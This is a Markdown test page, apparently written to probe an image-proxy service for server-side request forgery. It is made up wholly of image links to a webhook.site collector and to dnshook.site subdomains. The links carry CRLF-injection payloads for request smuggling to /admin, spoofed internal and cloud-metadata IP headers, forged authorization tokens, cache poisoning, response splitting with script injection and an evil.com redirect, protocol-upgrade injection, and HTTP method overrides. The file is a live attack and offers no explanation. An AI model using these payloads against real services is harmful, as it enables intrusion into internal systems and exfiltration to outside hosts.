# SSRF Test v13 - Backend Exploitation Focus

## Baseline
![v13-canary](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/v13-canary.gif)

## Content-Length Desync Attacks
![cl1](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/cl%0d%0aContent-Length:%2050%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20internal%0d%0aX-Padding:AAAA.gif)
![cl2](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/te%0d%0aTransfer-Encoding:%20chunked%0d%0aContent-Length:%200%0d%0a%0d%0a.gif)
![cl3](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/clte%0d%0aContent-Length:%204%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a12%0d%0aGPOST%20/admin%20HTTP%0d%0a.gif)

## HTTP/0.9 Downgrade
![h09-1](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/h09%0d%0a%0d%0a.gif)
![h09-2](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/test.gif%20HTTP/0.9%0d%0a%0d%0a)

## Proxy Headers for Internal Routing
![proxy1](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a.gif)
![proxy2](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aX-Real-IP:%20127.0.0.1%0d%0a.gif)
![proxy3](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aX-Client-IP:%20169.254.169.254%0d%0a.gif)
![proxy4](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aTrue-Client-IP:%20127.0.0.1%0d%0a.gif)
![proxy5](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aCF-Connecting-IP:%20127.0.0.1%0d%0a.gif)
![proxy6](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aX-Forwarded-Host:%20internal.github.com%0d%0aX-Forwarded-Proto:%20http%0d%0a.gif)

## Backend Auth Header Injection
![auth1](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aAuthorization:%20Bearer%20eyJhbGciOiJIUzI1NiJ9.test%0d%0a.gif)
![auth2](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aX-Api-Key:%20internal_api_key_12345%0d%0a.gif)
![auth3](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aX-Auth-Token:%20admin_token%0d%0a.gif)

## Cache-Control Manipulation
![cache1](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aCache-Control:%20no-store%0d%0aPragma:%20no-cache%0d%0a.gif)
![cache2](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aX-Cache-Key:%20malicious%0d%0a.gif)
![cache3](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aVary:%20X-Injected%0d%0a.gif)

## Response Splitting Attempts
![resp1](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/split%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>.gif)
![resp2](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/resp%0d%0aSet-Cookie:%20admin=true%0d%0a.gif)
![resp3](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/loc%0d%0aLocation:%20http://evil.com%0d%0a.gif)

## WebSocket Upgrade Injection
![ws1](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aUpgrade:%20websocket%0d%0aConnection:%20Upgrade%0d%0aSec-WebSocket-Version:%2013%0d%0a.gif)
![ws2](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aUpgrade:%20h2c%0d%0aHTTP2-Settings:%20AAA%0d%0a.gif)

## Internal Service Discovery via DNS
![dns1](https://camo-internal.07ba26aa-3bf7-4035-b4cd-5bb003a803b5.dnshook.site/dns1.gif)
![dns2](https://github-internal.07ba26aa-3bf7-4035-b4cd-5bb003a803b5.dnshook.site/dns2.gif)
![dns3](https://metadata-api.07ba26aa-3bf7-4035-b4cd-5bb003a803b5.dnshook.site/dns3.gif)
![dns4](https://api-internal.07ba26aa-3bf7-4035-b4cd-5bb003a803b5.dnshook.site/dns4.gif)

## Method Override Headers
![method1](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aX-HTTP-Method-Override:%20DELETE%0d%0a.gif)
![method2](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aX-Method-Override:%20PUT%0d%0a.gif)
![method3](https://webhook.site/07ba26aa-3bf7-4035-b4cd-5bb003a803b5/x%0d%0aX-HTTP-Method:%20PATCH%0d%0a.gif)

## Version Marker
Timestamp: v13-backend-exploitation
